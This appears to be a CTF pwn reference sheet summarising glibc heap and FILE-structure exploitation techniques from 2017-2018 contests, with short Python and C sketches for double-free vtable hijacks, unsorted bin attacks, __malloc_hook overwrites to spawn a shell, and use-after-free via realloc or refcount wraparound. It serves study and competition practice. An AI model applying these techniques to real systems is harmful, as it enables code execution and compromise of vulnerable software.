# CTF Pwn - Heap FILE Structure Attacks

## Table of Contents
- [Fastbin stdout Vtable Two-Stage Hijack (ASIS CTF 2017)](#fastbin-stdout-vtable-two-stage-hijack-for-pie--full-relro-asis-ctf-2017)
- [_IO_buf_base Null Byte Overwrite for stdin Hijack (Tokyo Westerns 2017)](#_io_buf_base-null-byte-overwrite-for-stdin-hijack-tokyo-westerns-2017)
- [glibc 2.24+ _IO_FILE Vtable Validation Bypass (HITCON 2017)](#glibc-224-_io_file-vtable-validation-bypass-hitcon-2017)
- [Unsorted Bin Attack on stdin _IO_buf_end (HITCON 2017)](#unsorted-bin-attack-on-stdin-_io_buf_end-hitcon-2017)
- [Unsorted Bin Corruption via mp_ Structure (HITCON 2017)](#unsorted-bin-corruption-via-mp_-structure-hitcon-2017)
- [realloc(ptr, 0) as free() for UAF (AceBear 2018)](#reallocptr-0-as-free-for-uaf-acebear-2018)
- [Single-Byte Reference Counter Wraparound to UAF (WhiteHat Grand Prix 2018)](#single-byte-reference-counter-wraparound-to-uaf-whitehat-grand-prix-2018)

---

## Fastbin stdout Vtable Two-Stage Hijack (ASIS CTF 2017)

**Pattern:** PIE + Full RELRO blocks GOT overwrite. Target libc's stdout FILE structure via fastbin attack with two-stage vtable hijack.

```python
# Stage 1: Fastbin double-free targeting fake chunk inside stdout
fake_chunk_addr = libc.sym['_IO_2_1_stdout_'] + 0x91  # contains 0x7f byte

free(A); free(B); free(A)  # double-free: fastbin 0x70 = [a -> b -> a]
malloc(0x60, p64(fake_chunk_addr))  # a's fd → fake chunk in stdout
malloc(0x60); malloc(0x60)  # returns a again

# Stage 2a: First vtable overwrite → gets()
# rdi = stdout struct, so gets(stdout) reads into stdout
write_to(fake_stdout_chunk, p64(gets_addr))  # vtable → gets

# Stage 2b: gets() reads second vtable + command into stdout
# Input: "1\x80;/bin/sh;" — new vtable points to system()
```

**Key insight:** The 0x7f byte in libc's stdout region satisfies fastbin size validation. Two-stage: first redirect vtable to `gets()` (rdi=stdout), then `gets()` overwrites vtable again with `system()`.

---

## _IO_buf_base Null Byte Overwrite for stdin Hijack (Tokyo Westerns 2017)

**Pattern:** Null-byte off-by-one corrupts `_IO_buf_base` LSB in stdin. Redirects stdin input buffer to `_short_buf` within the FILE struct itself. Subsequent `scanf` writes into FILE fields → arbitrary write.

```python
# Null-byte overflow: _IO_buf_base LSB = 0x00 → points into FILE struct
# Next scanf/fgets writes attacker input into FILE struct fields
# Overwrite _IO_buf_base/_IO_buf_end with arbitrary target addresses
# Next scanf reads from target → arbitrary write primitive
```

---

## glibc 2.24+ _IO_FILE Vtable Validation Bypass (HITCON 2017)

**Pattern:** glibc 2.24+ validates vtable pointers against `_IO_vtables` section. Bypass via two-hop dereference: place two heap pointers 0x10 apart, first at `valid_vtable_addr - 0x18`, second at `system()`. `_IO_flush_all_lockp` dereferences `*(addr + 0xd8) + 0x18` → lands in unchecked sub-function that calls `*(addr + 0xe8)`.

```python
# Using unsorted bin fd/bk as write targets (0x10 apart):
# [heap+0x00]: valid_vtable_addr - 0x18  (passes vtable check at offset 0xd8)
# [heap+0x10]: system()                  (called via *(addr + 0xe8))
```

Craft FILE with `_flags = " sh\x00"` for `system("sh")` argument. Trigger via `exit()`.

---

## Unsorted Bin Attack on stdin _IO_buf_end (HITCON 2017)

**Pattern:** Off-by-one NULL byte creates overlapping heap chunks. Free into unsorted bin, corrupt `bk` to overwrite `_IO_buf_end` of stdin. Next `scanf` reads attacker data into libc stdin buffer region → overwrite `__malloc_hook`.

```python
# Off-by-one NULL: corrupt next chunk's PREV_INUSE, set prev_size
# Free victim into unsorted bin → fd/bk point to main_arena
# Unsorted bin attack: set victim->bk = &stdin._IO_buf_end - 0x10
# malloc() removes victim → writes main_arena+88 → _IO_buf_end
# scanf reads huge input → __malloc_hook overwritten
```

---

## Unsorted Bin Corruption via mp_ Structure (HITCON 2017)

**Pattern:** glibc's `mp_` (`malloc_par`) global structure lies near unsorted bin. Heap overflow + unsorted bin corruption overwrites `mp_->bk` with address inside `mp_`. `mp_.trim_threshold` passes unsorted bin size validation. Allocate from "mp_-as-chunk" → write to `__malloc_hook`.

```python
# Heap overflow: corrupt unsorted bin chunk's bk → mp_ + offset
corrupted_bk = mp_addr + FAKE_CHUNK_OFFSET  # offset where size field looks valid

# malloc() of appropriate size → unsorted bin unlinks fake chunk at mp_
# Returns pointer into mp_ data
# Write one_gadget to __malloc_hook offset within returned chunk
malloc(size)
write_to_result(one_gadget)

# Trigger: next malloc() → __malloc_hook → one_gadget → shell
```

---

## realloc(ptr, 0) as free() for UAF (AceBear 2018)

**Pattern:** `realloc(ptr, 0)` behaves like `free(ptr)` in many glibc versions — returns chunk to freelist while app may retain old pointer.

```c
void *saved = ptr;
ptr = realloc(ptr, 0);  // ptr is NULL, chunk is freed
// saved still points to freed chunk → UAF!
```

```python
add(0, 0x80, b"AAAA")
edit(0, size=0)  # realloc(ptr, 0) = free(ptr), but index 0 still holds pointer
add(1, 0x80, b"BBBB")  # gets same chunk — UAF read via index 0
```

**Tcache variant (glibc 2.26+):** `realloc(ptr, 0)` puts chunk in tcache. Double-free via realloc → tcache poisoning.

---

## Single-Byte Reference Counter Wraparound to UAF (WhiteHat Grand Prix 2018)

**Pattern:** Struct stores refcount in `uint8_t`. Call `addref()` 256 times → refcount wraps to 0. Next `release()` frees the object while all handles still hold live pointers.

```c
struct Book {
    uint8_t refcount;      // 1 byte — vulnerable!
    void (*read)(struct Book*);
};

// 1. create(h0)              refcount = 1
// 2. dup(h0) → h1 ... h256  refcount wraps 1→2→...→255→0
// 3. release(h1)             refcount = 255 (underflow) → object freed
// 4. Heap reallocation fills same chunk with attacker data
// 5. read(h0) → calls attacker-controlled vtable pointer
```

**Key insight:** `uint8_t` refcounts always wrap at 256. Exploit needs 256 `addref` calls and one extra `release`.
